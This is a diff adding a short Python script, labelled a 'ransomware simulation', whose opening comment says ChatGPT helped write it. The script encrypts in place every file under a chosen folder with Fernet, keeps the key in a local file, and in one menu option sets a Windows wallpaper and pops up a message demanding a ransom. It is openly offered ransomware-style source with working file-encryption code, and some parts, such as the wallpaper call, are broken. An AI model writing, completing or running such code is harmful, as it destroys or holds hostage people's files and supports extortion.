@@ -1,0 +1,63 @@
+# i have to use help from chatgbt to get it done
+
+
+#!/usr/bin/env python3
+
+import os
+import ctypes
+from cryptography.fernet import Fernet
+
+def generate_key():
+    return Fernet.generate_key()
+
+def save_key(key, filename):
+    with open(filename, 'wb') as f:
+        f.write(key)
+
+def load_key(filename):
+    with open(filename, 'rb') as f:
+        return f.read()
+
+def crypt_folder(key, folder_path, action='encrypt'):
+    cipher = Fernet(key)
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            with open(os.path.join(root, file), 'rb+') as f:
+                data = f.read()
+                f.seek(0)
+                f.write(cipher.encrypt(data) if action == 'encrypt' else cipher.decrypt(data))
+
+def change_wallpaper(message):
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, message, 3)
+
+def display_popup(message, title):
+    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
+
+def ransomware_simulation():
+    print("1. Encrypt Folder\n2. Decrypt Folder\n3. Ransomware Simulation\n4. Exit")
+    choice = input("Enter your choice: ")
+    if choice == '1':
+        folder_path = input("Enter the path of the folder to encrypt: ")
+        crypt_folder(key, folder_path, action='encrypt')
+        print("Folder encrypted successfully.")
+    elif choice == '2':
+        folder_path = input("Enter the path of the folder to decrypt: ")
+        crypt_folder(key, folder_path, action='decrypt')
+        print("Folder decrypted successfully.")
+    elif choice == '3':
+        ransomware_message = "Your files have been encrypted! Pay the ransom to get them back."
+        change_wallpaper(ransomware_message)
+        display_popup(ransomware_message, "Ransomware Alert")
+        print("Ransomware simulation executed.")
+    elif choice == '4':
+        exit()
+    else:
+        print("Invalid choice.")
+
+# Example usage:
+key = generate_key()
+save_key(key, 'encryption_key.key')
+
+while True:
+    ransomware_simulation()
